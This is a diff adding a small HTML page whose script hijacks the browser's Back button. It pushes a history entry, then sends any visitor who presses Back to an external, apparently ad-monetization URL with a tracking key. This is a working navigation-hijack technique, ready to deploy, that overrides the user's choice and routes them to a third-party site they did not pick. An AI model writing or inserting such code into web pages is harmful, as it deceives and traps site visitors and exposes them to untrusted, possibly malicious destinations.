@@ -1,0 +1,23 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Back Button Redirect</title>
+  <script>
+    // Detect when the back button is pressed
+    window.onpopstate = function(event) {
+      // Redirect user to the desired URL
+      window.location.href = "https://twirlparchextent.com/t5t3vttb?key=f24345116e0a3c3d63cb88c4b1061844";
+    };
+
+    // Add a new state to prevent immediate redirection
+    window.history.pushState(null, "", window.location.href);
+  </script>
+</head>
+<body>
+  <h1>Welcome to the Page!</h1>
+  <p>If you try to go back, you will be redirected automatically.</p>
+</body>
+</html>
